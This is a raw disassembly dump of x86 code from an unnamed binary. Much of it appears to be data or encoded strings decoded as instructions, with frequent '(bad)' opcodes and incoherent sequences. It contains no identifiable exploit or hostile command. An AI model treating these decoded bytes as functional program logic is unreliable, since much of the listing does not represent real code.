  4218be:	cmp    eax,0x394f804e
  4218c3:	dec    esi
  4218c4:	lods   al,BYTE PTR ds:[esi]
  4218c5:	dec    edi
  4218c6:	cmp    cl,BYTE PTR [esi+0x30]
  4218c9:	dec    esi
  4218ca:	inc    esi
  4218cb:	dec    esi
  4218cc:	pop    esp
  4218cd:	int    0x5f
  4218cf:	ret    0xd26f
  4218d2:	outs   dx,BYTE PTR ds:[esi]
  4218d3:	sar    DWORD PTR [esi-0x1d],cl
  4218d6:	jns    0x4218b8
  4218d8:	aas    
  4218d9:	dec    esi
  4218da:	mov    cs,WORD PTR [edi+0x30]
  4218dd:	dec    esi
  4218de:	lods   al,BYTE PTR ds:[esi]
  4218df:	dec    edi
  4218e0:	cmp    eax,0x394f834e
  4218e5:	dec    esi
  4218e6:	mov    ds:0x304e3a4f,al
  4218eb:	dec    esi
  4218ec:	inc    esp
  4218ed:	dec    esi
  4218ee:	pop    esp
  4218ef:	fstp   QWORD PTR [edi-0x2e]
  4218f2:	outs   dx,DWORD PTR ds:[esi]
  4218f3:	loop   0x421963
  4218f5:	jecxz  0x421975
  4218f7:	repz jns 0x4218ea
  4218fa:	aas    
  4218fb:	dec    esi
  4218fc:	lea    ecx,[edi+0x30]
  4218ff:	dec    esi
  421900:	lahf   
  421901:	dec    edi
  421902:	cmp    eax,0x3c4fa04e
  421907:	dec    esi
  421908:	xor    BYTE PTR [esi+0x3f],cl
  42190b:	dec    esi
  42190c:	pop    esp
  42190d:	in     eax,dx
  42190e:	pop    edi
  42190f:	loop   0x421980
  421911:	repnz outs dx,BYTE PTR ds:[esi]
  421913:	repz jle 0x421919
  421916:	jns    0x421918
  421918:	jle    0x42192d
  42191a:	jns    0x42192c
  42191c:	cmp    al,0x4e
  42191e:	jg     0x42196e
  421920:	xor    BYTE PTR [esi-0x65],cl
  421923:	dec    edi
  421924:	xor    cl,BYTE PTR [esi-0x80]
  421927:	dec    edi
  421928:	cmp    al,0x4e
  42192a:	lods   eax,DWORD PTR ds:[esi]
  42192b:	dec    edi
  42192c:	cmp    ecx,DWORD PTR [esi+0x30]
  42192f:	dec    esi
  421930:	inc    ebp
  421931:	dec    esi
  421932:	pop    esp
  421933:	or     eax,0x126f025f
  421938:	outs   dx,BYTE PTR ds:[esi]
  421939:	adc    edi,DWORD PTR [esi+0x23]
  42193c:	jns    0x42195e
  42193e:	aas    
  42193f:	dec    esi
  421940:	add    BYTE PTR [eax],al
  421942:	retf   0x4217
  421945:	add    BYTE PTR [esi-0x39ffbde7],bh
  42194b:	sbb    DWORD PTR [edx+0x0],eax
  42194e:	outs   dx,BYTE PTR ds:[esi]
  42194f:	sbb    eax,DWORD PTR [edx+0x0]
  421952:	ficomp DWORD PTR [edx]
  421954:	inc    edx
  421955:	add    BYTE PTR [esi+0x1b],bl
  421958:	inc    edx
  421959:	add    BYTE PTR [esi-0x55ffbde7],ah
  42195f:	sbb    DWORD PTR [edx+0x0],eax
  421962:	pop    edx
  421963:	sbb    eax,DWORD PTR [edx+0x0]
  421966:	push   cs
  421967:	sbb    al,BYTE PTR [edx+0x0]
  42196a:	or     eax,0x36f89ca9
  42196f:	mov    edx,0x19c2f89c
  421974:	inc    edx
  421975:	add    BYTE PTR [edx-0x59ffbde6],dl
  42197b:	sbb    al,BYTE PTR [edx+0x0]
  42197e:	mov    dl,0x1a
  421980:	inc    edx
  421981:	add    dl,al
  421983:	sbb    al,BYTE PTR [edx+0x0]
  421986:	cli    
  421987:	sbb    DWORD PTR [edx+0x0],eax
  42198a:	(bad)  
  42198b:	pop    ss
  42198c:	inc    edx
  42198d:	add    BYTE PTR [edx],bl
  42198f:	sbb    al,BYTE PTR [edx+0x0]
  421992:	or     bl,BYTE PTR [edx]
  421994:	inc    edx
  421995:	add    BYTE PTR [edx+0x1b],dh
  421998:	inc    edx
  421999:	add    BYTE PTR [esi+0x19f89c85],dh
  42199f:	or     edx,DWORD PTR [edi]
  4219a1:	or     esi,0x14004219
  4219a7:	sbb    al,0x16
  4219a9:	or     DWORD PTR [eax],0x7050d
  4219af:	add    BYTE PTR [eax+0x0],al
  4219b2:	cmp    al,BYTE PTR [edx+0x3e]
  4219b5:	ds enter 0x4279,0x0
  4219ba:	ins    DWORD PTR es:[edi],dx
  4219bb:	push   ebp
  4219bc:	inc    esp
  4219bd:	imul   ecx,DWORD PTR [eax],0x86275fa
  4219c3:	in     eax,dx
  4219c4:	inc    BYTE PTR [edi]
  4219c6:	aas    
  4219c7:	cli    
  4219c8:	mov    ds:0x4219b605,eax
  4219cd:	add    BYTE PTR [ebp-0x4a07636b],dh
  4219d3:	xchg   esi,eax
  4219d4:	pushf  
  4219d5:	clc    
  4219d6:	mov    ah,0x95
  4219d8:	pushf  
  4219d9:	clc    
  4219da:	mov    ebx,0xbaf89c95
  4219df:	xchg   ebp,eax
  4219e0:	pushf  
  4219e1:	clc    
  4219e2:	mov    ecx,0xb8f89c95
  4219e7:	xchg   ebp,eax
  4219e8:	pushf  
  4219e9:	clc    
  4219ea:	mov    edi,0xbef89c95
  4219ef:	xchg   ebp,eax
  4219f0:	pushf  
  4219f1:	clc    
  4219f2:	mov    ebp,0xa6f89c95
  4219f7:	xchg   ebp,eax
  4219f8:	pushf  
  4219f9:	clc    
  4219fa:	jmp    0x4217:0xbe6003f9
  421a01:	add    BYTE PTR [eax+eax*2+0x42],ch
  421a05:	add    BYTE PTR [ebx+0x77],dl
  421a08:	jbe    0x421a5a
  421a0a:	mov    dh,0x85
  421a0c:	pushf  
  421a0d:	clc    
  421a0e:	sbb    ecx,ebp
  421a10:	push   eax
  421a11:	pop    es
  421a12:	dec    eax
  421a13:	or     al,BYTE PTR [eax]
  421a15:	add    BYTE PTR [edx+0x1b004217],bh
  421a1b:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421a4e:	ins    BYTE PTR es:[edi],dx
  421a4f:	inc    eax
  421a50:	inc    edx
  421a51:	add    BYTE PTR [esi+0x66f89c85],dh
  421a57:	add    BYTE PTR [edx+0x0],ch
  421a5a:	add    BYTE PTR [si+0x0],ah
  421a5e:	push   0x64006700
  421a63:	add    BYTE PTR [esi+0x0],ah
  421a66:	push   0x0
  421a68:	push   0x66006400
  421a6d:	add    BYTE PTR [edi+0x0],ah
  421a70:	push   0x0
  421a72:	push   0x66006700
  421a77:	add    BYTE PTR [eax+0x0],ch
  421a7a:	add    BYTE PTR [bp+0x0],ah
  421a7e:	push   0x66006700
	...
  421a8b:	add    BYTE PTR [eax],al
  421a8d:	add    BYTE PTR [edi+0x5c],ch
  421a90:	inc    eax
  421a91:	add    BYTE PTR [ebp-0x5db060b1],ah
  421a97:	dec    edi
  421a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a99:	dec    edi
  421a9a:	lahf   
  421a9b:	dec    edi
  421a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a9d:	dec    edi
  421a9e:	ins    DWORD PTR es:[edi],dx
  421a9f:	dec    esi
  421aa0:	bound  ecx,QWORD PTR [esi+0x30]
  421aa3:	dec    esi
  421aa4:	add    BYTE PTR [eax],al
  421aa6:	cdq    
  421aa7:	dec    edi
  421aa8:	pushf  
  421aa9:	dec    edi
  421aaa:	fwait
  421aab:	dec    edi
  421aac:	ins    DWORD PTR es:[edi],dx
  421aad:	dec    esi
  421aae:	bound  ecx,QWORD PTR [esi+0x30]
  421ab1:	dec    esi
  421ab2:	scas   eax,DWORD PTR es:[edi]
  421ab3:	dec    edi
  421ab4:	lods   eax,DWORD PTR ds:[esi]
  421ab5:	dec    edi
  421ab6:	lahf   
  421ab7:	dec    edi
  421ab8:	mov    ds:0x624e6d4f,al
  421abd:	dec    esi
  421abe:	xor    BYTE PTR [esi+0x0],cl
  421ac1:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421ac7:	dec    edi
  421ac8:	test   eax,0xa04f934f
  421acd:	dec    edi
  421ace:	fwait
  421acf:	dec    edi
  421ad0:	xor    BYTE PTR [esi+0x0],cl
  421ad3:	add    BYTE PTR [eax],al
  421ad5:	add    BYTE PTR [eax],al
  421ad7:	add    BYTE PTR [eax],al
  421ad9:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421ae0:	mov    WORD PTR [ebp-0x32734274],gs
  421ae6:	mov    ebp,ds
  421ae8:	mov    ebp,gs
  421aea:	mov    ebp,?
  421aec:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421af2:	mov    WORD PTR ds:0x6d8c5d8c,?
  421af8:	mov    WORD PTR [edx-0x74],?
  421afb:	jae    0x421a89
  421afd:	jo     0x421a8b
  421aff:	jno    0x421a8d
  421b01:	jbe    0x421a8f
  421b03:	ja     0x421a91
  421b05:	je     0x421a93
  421b07:	jne    0x421a95
  421b09:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421b10:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421b16:	lods   al,BYTE PTR ds:[esi]
  421b17:	jge    0x421ad5
  421b19:	jge    0x421ab9
  421b1b:	(bad)  
  421b1c:	jns    0x421b91
  421b1e:	mov    ecx,0x7d738cb1
  421b23:	ins    DWORD PTR es:[edi],dx
  421b24:	enter  0x9fc6,0x26
  421b28:	jb     0x421b2d
  421b2a:	test   eax,0xb956bb17
  421b2f:	hlt    
  421b30:	test   al,0x37
  421b32:	test   al,0x7e
  421b34:	fnstenv [ecx-0x6a]
  421b37:	mov    cl,0x6a
  421b39:	push   0xffffffce
  421b3b:	or     BYTE PTR [edx],bl
  421b3d:	xlat   BYTE PTR ds:[ebx]
  421b3e:	out    dx,eax
  421b3f:	add    eax,0x9321d7aa
  421b44:	scas   al,BYTE PTR es:[edi]
  421b45:	adc    DWORD PTR [esi],esp
  421b47:	jge    0x421b6c
  421b49:	fidiv  WORD PTR [edi]
  421b4b:	leave  
  421b4c:	hlt    
  421b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b4e:	cmp    ax,0x1fc8
  421b52:	mov    dh,cl
  421b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b55:	(bad)  
  421b56:	and    DWORD PTR [eax],ebx
  421b58:	and    DWORD PTR [ecx-0x18],esi
  421b5b:	(bad)  [ebx+0x7]
  421b5e:	cmc    
  421b5f:	enter  0x301a,0x14
  421b63:	inc    eax
  421b64:	inc    edx
  421b65:	add    BYTE PTR [ecx+0x66],dh
  421b68:	jp     0x421bd8
  421b6a:	scas   al,BYTE PTR es:[edi]
  421b6b:	sbb    DWORD PTR [edx+0x0],eax
  421b6e:	adc    bl,BYTE PTR [edx]
  421b70:	inc    edx
  421b71:	add    BYTE PTR [eax],cl
  421b73:	in     eax,dx
  421b74:	adc    al,BYTE PTR [edi]
  421b76:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421b7d:	ins    BYTE PTR es:[edi],dx
  421b7e:	push   0x49657557
  421b83:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421b89:	push   edi
  421b8a:	jp     0x421c06
  421b8c:	dec    ebp
  421b8d:	push   esi
  421b8e:	arpl   WORD PTR gs:[ecx+0x45],si
  421b92:	dec    edx
  421b93:	dec    esi
  421b94:	data16 ja 0x421be5
  421b97:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421bb2:	inc    ebp
  421bb3:	push   edx
  421bb4:	jb     0x421c2a
  421bb6:	inc    esi
  421bb7:	je     0x421bfa
  421bb9:	inc    esi
  421bba:	jae    0x421c32
  421bbc:	dec    ebx
  421bbd:	gs dec ecx
  421bbf:	dec    ebp
  421bc0:	dec    ebp
  421bc1:	pop    edx
  421bc2:	jp     0x421c1e
  421bc4:	jbe    0x421c0c
  421bc6:	pop    ecx
  421bc7:	jo     0x421c41
  421bc9:	inc    edi
  421bca:	gs ins BYTE PTR es:[edi],dx
  421bcc:	dec    esp
  421bcd:	js     0x421c37
  421bcf:	inc    edx
  421bd0:	js     0x421c18
  421bd2:	dec    eax
  421bd3:	inc    ebp
  421bd4:	inc    esp
  421bd5:	inc    esp
  421bd6:	push   ecx
  421bd7:	dec    edx
  421bd8:	ins    BYTE PTR es:[edi],dx
  421bd9:	dec    ebx
  421bda:	jbe    0x421c4a
  421bdc:	pop    eax
  421bdd:	jbe    0x421c2a
  421bdf:	inc    ecx
  421be0:	fs gs jno 0x421c51
  421be4:	push   ebx
  421be5:	inc    ecx
  421be6:	add    BYTE PTR [eax],al
  421be8:	inc    ebx
  421be9:	outs   dx,BYTE PTR ds:[esi]
  421bea:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421bee:	push   edx
  421bef:	push   ecx
  421bf0:	push   0x74000064
  421bf5:	jne    0x421c6c
  421bf7:	ins    DWORD PTR es:[edi],dx
  421bf8:	push   ecx
  421bf9:	push   eax
  421bfa:	jo     0x421c76
  421bfc:	addr16 jo 0x421c55
  421bff:	pop    eax
  421c00:	add    BYTE PTR [eax],al
  421c02:	push   ecx
  421c03:	pop    ecx
  421c04:	inc    ebx
  421c05:	inc    edx
  421c06:	outs   dx,BYTE PTR ds:[esi]
  421c07:	popa   
  421c08:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421c0c:	jne    0x421c7c
  421c0e:	dec    ebx
  421c0f:	je     0x421c74
  421c11:	bound  esp,QWORD PTR [edi+0x0]
  421c14:	jns    0x421c5b
  421c16:	bound  ebp,QWORD PTR [ecx+0x46]
  421c19:	dec    ecx
  421c1a:	ja     0x421c61
  421c1c:	dec    eax
  421c1d:	inc    ebp
  421c1e:	inc    edx
  421c1f:	push   ebx
  421c20:	add    BYTE PTR [eax],al
  421c22:	outs   dx,DWORD PTR ds:[esi]
  421c23:	inc    edi
  421c24:	dec    esi
  421c25:	outs   dx,DWORD PTR ds:[esi]
  421c26:	pop    ecx
  421c27:	inc    edi
  421c28:	jb     0x421c71
  421c2a:	jns    0x421ca2
  421c2c:	inc    ecx
  421c2d:	pop    eax
  421c2e:	dec    esp
  421c2f:	add    BYTE PTR [eax+0x48],bh
  421c32:	bound  edx,QWORD PTR [ebx+0x43]
  421c35:	pop    eax
  421c36:	outs   dx,DWORD PTR ds:[esi]
  421c37:	push   0x4355
  421c3c:	dec    esp
  421c3d:	ins    BYTE PTR es:[edi],dx
  421c3e:	inc    edx
  421c3f:	push   0x76666a73
  421c44:	inc    edx
  421c45:	jo     0x421c47
  421c47:	add    BYTE PTR [eax],al
  421c49:	add    BYTE PTR [edi+0x6d],ah
  421c4c:	je     0x421c95
  421c4e:	ins    BYTE PTR es:[edi],dx
  421c4f:	jae    0x421cbb
  421c51:	inc    esi
  421c52:	ins    DWORD PTR es:[edi],dx
  421c53:	je     0x421cab
  421c55:	push   0x56584178
  421c5a:	push   ebx
  421c5b:	addr16 dec edx
  421c5d:	jo     0x421cd1
  421c5f:	js     0x421cd0
  421c61:	pop    eax
  421c62:	dec    ebx
  421c63:	push   esp
  421c64:	dec    esp
  421c65:	jns    0x421cb2
  421c67:	js     0x421ce1
  421c69:	outs   dx,BYTE PTR ds:[esi]
  421c6a:	pop    ecx
  421c6b:	jae    0x421cdb
  421c6d:	push   0x43644448
  421c72:	arpl   WORD PTR [edx+0x55],sp
  421c75:	push   0x42504e67
  421c7a:	push   ebp
  421c7b:	je     0x421cf2
  421c7d:	addr16 dec edi
  421c7f:	dec    esp
  421c80:	inc    edx
  421c81:	ins    DWORD PTR es:[edi],dx
  421c82:	inc    esi
  421c83:	inc    esi
  421c84:	inc    esi
  421c85:	arpl   WORD PTR [edx+0x47],bx
  421c88:	push   ebp
  421c89:	inc    ebx
  421c8a:	popa   
  421c8b:	push   edx
  421c8c:	dec    esp
  421c8d:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421c94:	push   ecx
  421c95:	push   ebx
  421c96:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421c9d:	dec    edx
  421c9e:	jns    0x421d09
  421ca0:	push   edx
  421ca1:	inc    ebx
  421ca2:	jo     0x421d19
  421ca4:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421ca8:	fs push ebx
  421caa:	inc    ebx
  421cab:	push   ebp
  421cac:	push   eax
  421cad:	ja     0x421cea
  421caf:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421cb3:	mov    ebp,0xa53ddffb
  421cb8:	js     0x421c73
  421cba:	sbb    al,0xb1
  421cbc:	push   ebx
  421cbd:	out    dx,eax
  421cbe:	cmp    ebp,edx
  421cc0:	add    DWORD PTR [eax],eax
  421cc2:	pop    esp
  421cc3:	add    BYTE PTR [eax],al
  421cc5:	add    BYTE PTR [edi],dh
  421cc7:	rcl    DWORD PTR [esi],1
  421cc9:	and    BYTE PTR ds:0xbc7bed51,0x69
  421cd0:	and    eax,DWORD PTR [ebp-0xb]
  421cd3:	pop    eax
  421cd4:	mov    bl,0xc
  421cd6:	cmp    eax,0xcec2817e
  421cdb:	dec    ebp
  421cdc:	(bad)  
  421cdd:	out    dx,al
  421cde:	jne    0x421cd4
  421ce0:	xchg   esi,eax
  421ce1:	mov    cl,0x29
  421ce3:	or     eax,0x743e06e4
  421ce8:	daa    
  421ce9:	inc    ebx
  421cea:	jne    0x421cfe
  421cec:	mov    ss,WORD PTR [ecx-0x5bf7d35e]
  421cf2:	das    
  421cf3:	icebp  
  421cf4:	push   edi
  421cf5:	add    BYTE PTR [ecx-0x52],bh
  421cf8:	mov    dl,0x55
  421cfa:	popf   
  421cfb:	push   0xfffffffc
  421cfd:	fwait
  421cfe:	stos   BYTE PTR es:[edi],al
  421cff:	fucomip st,st(3)
  421d01:	jbe    0x421cdd
  421d03:	pop    ebp
  421d04:	inc    edi
  421d05:	xor    BYTE PTR [edi+0xd],ch
  421d08:	das    
  421d09:	cld    
  421d0a:	arpl   WORD PTR [si-0x69],sp
  421d0e:	jo     0x421d31
  421d10:	cdq    
  421d11:	sar    BYTE PTR [edx-0x2525f40],1
  421d17:	aaa    
  421d18:	fisub  DWORD PTR [esi+ecx*1]
  421d1b:	mov    ch,0x78
  421d1d:	adc    DWORD PTR [ebp+0x628242],ecx
	...
  421d2b:	add    BYTE PTR [eax],al
  421d2d:	add    BYTE PTR [eax],ch
  421d2f:	mov    dl,0xa5
  421d31:	push   edx
  421d32:	mov    edi,0x7cfaff57
  421d37:	xlat   BYTE PTR fs:[ebx]
  421d39:	push   esi
  421d3a:	inc    ebx
  421d3b:	fistp  QWORD PTR [esp+eiz*2+0x1d595]
  421d42:	pop    esp
  421d43:	add    BYTE PTR [eax],al
  421d45:	add    bl,ah
  421d47:	sar    DWORD PTR [esp+ebp*8-0x6d],0x7d
  421d4c:	adc    al,0x90
  421d4e:	dec    BYTE PTR [eax]
  421d50:	mov    ds:0x3213387a,al
  421d55:	and    eax,0x482167f4
  421d5a:	push   ebp
  421d5b:	adc    ebp,esp
  421d5d:	push   ebp
  421d5e:	ror    DWORD PTR [edi-0x11ffd728],1
  421d64:	push   es
  421d65:	add    BYTE PTR [ecx-0x6d],bl
  421d68:	lea    ebp,[esi+0x5a]
  421d6b:	xor    BYTE PTR [esi-0x3b06dc41],bl
  421d71:	and    DWORD PTR [edi+0x7f],eax
  421d74:	pushf  
  421d75:	bound  edx,QWORD PTR [eax-0xb]
  421d78:	pop    eax
  421d79:	sub    eax,0xfc77ec6c
  421d7e:	outs   dx,BYTE PTR ds:[esi]
  421d7f:	mov    ebp,0xe20fe191
  421d84:	push   eax
  421d85:	inc    ecx
  421d86:	mov    dl,0x40
  421d88:	ss sbb DWORD PTR cs:[ebx+0x3e05cb95],ecx
  421d90:	cmp    BYTE PTR [ebx+0x30b7b966],bl
  421d96:	mov    bl,0xc6
  421d98:	jle    0x421da0
  421d9a:	shl    BYTE PTR [ebx+0x614cb715],1
  421da0:	mov    al,BYTE PTR [ecx+0x0]
	...
  421dae:	mov    bl,0x55
  421db0:	jg     0x421d33
  421db2:	jmp    FWORD PTR [ebx-0x69418801]
  421db8:	push   0x947a7957
  421dbd:	iret   
  421dbe:	icebp  
  421dbf:	aad    0x1
  421dc1:	add    BYTE PTR [eax+eax*1+0x0],bl
  421dc5:	add    al,dh
  421dc7:	shl    DWORD PTR [ebx-0x747c60b],cl
  421dcd:	test   DWORD PTR [edx+0x4c215de2],ecx
  421dd3:	into   
  421dd4:	mov    ds:0x717ac63f,al
  421dd9:	out    0x93,eax
  421ddb:	jecxz  0x421ddd
  421ddd:	sbb    eax,0x6f294e1f
  421de2:	jmp    0xda9fc5fc
  421de7:	cmp    esp,DWORD PTR [esi+0x1ea566a6]
  421ded:	in     al,dx
  421dee:	xor    ebp,DWORD PTR [ebp+0x1a]
  421df1:	jnp    0x421d86
  421df3:	jp     0x421db7
  421df5:	dec    DWORD PTR [ecx+0xe6159dd]
  421dfb:	and    eax,0xbb718ffc
  421e00:	push   0x3e
  421e02:	jmp    0x421de3
  421e04:	jge    0x421db7
  421e06:	mov    ah,dh
  421e08:	mov    BYTE PTR [eiz*4+0xbb7ff4b],cl
  421e0f:	ss dec esp
  421e11:	push   ecx
  421e12:	lea    ecx,[ecx+0x37931ffc]
  421e18:	inc    edx
  421e19:	addr16 iret 
  421e1b:	mov    BYTE PTR [ebx+0x74],ah
  421e1e:	gs jne 0x421e4f
  421e21:	adc    eax,DWORD PTR [eax]
	...
  421e2b:	add    BYTE PTR [eax],al
  421e2d:	add    BYTE PTR [eax],bh
  421e2f:	(bad)  
  421e30:	cmp    ah,BYTE PTR [esi+edi*8]
  421e33:	in     al,dx
  421e34:	fimul  WORD PTR ds:[edi-0x7b53942b]
  421e3b:	jl     0x421e5c
  421e3d:	add    al,0x4d
  421e3f:	(bad)  
  421e40:	add    DWORD PTR [eax],eax
  421e42:	pop    esp
  421e43:	add    BYTE PTR [eax],al
  421e45:	add    ah,cl
  421e47:	mov    ebx,0x4535d38
  421e4c:	jno    0x421e3e
  421e4e:	xchg   edx,eax
  421e4f:	fsub   DWORD PTR [ecx+0x199e39d4]
  421e55:	mov    eax,0xd813af3d
  421e5a:	(bad)  
  421e5c:	jno    0x421ea6
  421e5e:	jae    0x421df2
  421e60:	shr    bl,cl
  421e62:	sbb    dl,0x0
  421e65:	or     eax,0xc9742b6c
  421e6a:	xlat   BYTE PTR ds:[ebx]
  421e6b:	xlat   BYTE PTR ds:[ebx]
  421e6c:	je     0x421e89
  421e6e:	test   eax,0xd420bf48
  421e73:	jmp    0x77b9:0x53cdc771
  421e7a:	in     al,dx
  421e7b:	push   ds
  421e7c:	rol    DWORD PTR ds:0xc27a9e5f,0xfd
  421e83:	push   0x1fa2fcf
  421e88:	xchg   DWORD PTR [ecx-0x5c38d664],ebp
  421e8e:	or     eax,0x281fea9e
  421e93:	mov    ebp,0x60796ce7
  421e98:	rcl    DWORD PTR [ebx+0x7a],1
  421e9b:	sbb    bl,al
  421e9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e9e:	lock mov al,ds:0x2bf
	...
  421eac:	add    BYTE PTR [eax],al
  421eae:	fnstenv [esi-0x2490e49a]
  421eb4:	std    
  421eb5:	neg    BYTE PTR [esi]
  421eb7:	sub    esp,DWORD PTR [ebx-0x23]
  421eba:	mov    ds,WORD PTR [esi-0x1c]
  421ebd:	shr    BYTE PTR [ecx+0x5c0001d6],cl
  421ec3:	add    BYTE PTR [eax],al
  421ec5:	add    cl,al
  421ec7:	jmp    0x805:0xce28de70
  421ece:	push   edi
  421ecf:	mov    bl,ah
  421ed1:	push   edi
  421ed2:	dec    eax
  421ed3:	mov    ebx,0xbcc12cfa
  421ed8:	cmp    BYTE PTR [ebx-0x4f],bl
  421edb:	jno    0x421edc
  421edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ede:	punpckhwd mm2,QWORD PTR ss:[esi+0xb65a65f]
  421ee6:	sub    DWORD PTR [edi+0x21ca13ac],esp
  421eec:	aaa    
  421eed:	adc    bh,bh
  421eef:	xchg   BYTE PTR [edx-0x5ede869],al
  421ef5:	and    eax,0x2739003
  421efa:	dec    eax
  421efb:	imul   edi,esi,0xffffffba
  421efe:	fidiv  WORD PTR [edx+esi*4+0x77d651f7]
  421f05:	imul   ecx,DWORD PTR [edx+edi*4+0x30],0xf8fedacf
  421f0d:	add    eax,0x419dccf0
  421f12:	sub    al,0xc7
  421f14:	xchg   esp,eax
  421f15:	xchg   ecx,eax
  421f16:	mov    esi,0x83a6e8b7
  421f1b:	loope  0x421f05
  421f1d:	in     eax,dx
  421f1e:	jo     0x421f78
  421f20:	mov    al,0xc4
	...
  421f2e:	fidiv  DWORD PTR [edx]
  421f30:	xchg   edi,eax
  421f31:	mov    bh,bh
  421f33:	scas   eax,DWORD PTR es:[edi]
  421f34:	fbstp  TBYTE PTR [edx+0x3]
  421f37:	inc    ebp
  421f38:	mov    ds:0xaa3b6b5c,eax
  421f3d:	add    eax,0x1d705
  421f42:	pop    esp
  421f43:	add    BYTE PTR [eax],al
  421f45:	add    BYTE PTR [ebp-0x7f],dl
  421f48:	scas   eax,DWORD PTR es:[edi]
  421f49:	jo     0x421ee1
  421f4b:	imul   esi,DWORD PTR [ebp+edx*1-0xf2745d1],0xffffffbe
  421f53:	mov    cl,0x29
  421f55:	pusha  
  421f56:	adc    DWORD PTR [ebp+0x356de1e6],ebp
  421f5c:	ds dec edi
  421f5e:	cmp    DWORD PTR ds:0xdda58b84,0xffffff9c
  421f65:	xchg   edx,eax
  421f66:	inc    edx
  421f67:	fnstenv [esi+0xe]
  421f6a:	test   BYTE PTR [ebx+eiz*1+0x2f],ah
  421f6e:	cld    
  421f6f:	or     edx,DWORD PTR [ebx-0x51]
  421f72:	dec    ecx
  421f73:	fnsave [edi+eiz*1-0x329a9cf0]
  421f7a:	(bad)  
  421f7b:	je     0x421f04
  421f7d:	jmp    0x4f18:0xb0138213
  421f84:	sar    BYTE PTR [ecx-0x7a3b7667],cl
  421f8a:	je     0x421f1b
  421f8c:	inc    esi
  421f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f8e:	rcl    DWORD PTR ss:[edx+0x21bc9d3c],0x81
  421f96:	sub    BYTE PTR [esi+0x2c1f87d0],0x2f
  421f9d:	jmp    0x0:0x5b62beb2
	...
  421fac:	add    BYTE PTR [eax],al
  421fae:	dec    eax
  421faf:	in     al,0x3
  421fb1:	fwait
  421fb2:	scas   eax,DWORD PTR es:[edi]
  421fb3:	(bad)  
  421fb4:	fdiv   st,st(7)
  421fb6:	pop    esi
  421fb7:	sub    BYTE PTR [eax-0xa961771],bl
  421fbd:	mov    esi,0x1d761
  421fc2:	pop    esp
  421fc3:	add    BYTE PTR [eax],al
  421fc5:	add    BYTE PTR [eax],dl
  421fc7:	cmp    al,BYTE PTR [edi+0x4f]
  421fca:	aam    0x98
  421fcc:	lock fstp DWORD PTR [esi]
  421fcf:	jecxz  0x421faa
  421fd1:	rcr    DWORD PTR [ebx],1
  421fd3:	and    eax,0x12ae8c7c
  421fd8:	cli    
  421fd9:	ja     0x42202a
  421fdb:	(bad)  
  421fdd:	sub    eax,eax
  421fdf:	and    eax,0xff48c705
  421fe4:	pop    esp
  421fe5:	fdivr  DWORD PTR [ebx+ebx*8]
  421fe8:	and    edx,0xffffffec
  421feb:	frstor [ebx+0x5d12aea0]
  421ff1:	test   BYTE PTR [ebx+ebx*4],cl
  421ff4:	jb     0x422073
  421ff6:	push   eax
  421ff7:	push   cs
  421ff8:	mov    ds:0x703b714f,eax
  421ffd:	(bad)  
  421ffe:	rcr    edx,0xd0
  422001:	or     BYTE PTR [ebp-0x26],dh
  422004:	ins    DWORD PTR es:[edi],dx
  422005:	or     BYTE PTR ds:0xa870095c,al
  42200b:	shl    DWORD PTR [eax+edi*1-0x4b],1
  42200f:	jb     0x422025
  422011:	cdq    
  422012:	push   es
  422013:	sub    al,0x5d
  422015:	aad    0xf
  422017:	test   al,0x19
  422019:	sbb    BYTE PTR [ebp-0x25],al
  42201c:	mov    ebx,0x4f78427b
  422021:	in     al,dx
	...
  42202e:	push   edx
  42202f:	add    al,0xa2
  422031:	xor    dh,0xa6
  422034:	jb     0x42200a
  422036:	ins    DWORD PTR es:[edi],dx
  422037:	xor    dh,BYTE PTR [edx]
  422039:	and    eax,0xa6c06ccf
  42203e:	mov    ebp,0x5c0001d7
  422043:	add    BYTE PTR [eax],al
  422045:	add    dl,dl
  422047:	sub    al,0xef
  422049:	in     al,0x95
  42204b:	mov    dl,0x6c
  42204d:	pop    ds
  42204e:	ficom  DWORD PTR [eax]
  422050:	pop    ds
  422051:	push   esi
  422052:	out    dx,eax
  422053:	mov    edi,0x25e0761b
  422058:	in     al,dx
  422059:	sbb    DWORD PTR [edx+0x9],0x6d90fae8
  422060:	adc    edx,DWORD PTR [ecx+0x8]
  422063:	mov    ds:0x60ebb9d4,eax
  422068:	xchg   edx,eax
  422069:	sahf   
  42206a:	sti    
  42206b:	std    
  42206c:	jg     0x4220e1
  42206e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42206f:	(bad)  
  422070:	into   
  422071:	add    ebx,esp
  422073:	pushf  
  422074:	les    ebx,FWORD PTR [esi-0x1a]
  422077:	gs addr16 mov al,0xb0
  42207b:	and    dl,ch
  42207d:	cdq    
  42207e:	icebp  
  42207f:	xchg   ebx,eax
  422080:	test   eax,0xf9ea1225
  422085:	neg    bh
  422087:	hlt    
  422088:	pop    eax
  422089:	out    dx,eax
  42208a:	jnp    0x4220c1
  42208c:	iret   
  42208d:	jno    0x422075
  42208f:	push   ecx
  422090:	scas   eax,DWORD PTR es:[edi]
  422091:	stc    
  422092:	cli    
  422093:	push   0xffffffda
  422095:	(bad)  
  422097:	loop   0x4220a3
  422099:	int    0x96
  42209b:	das    
  42209c:	out    dx,al
  42209d:	xor    ebp,DWORD PTR [edx]
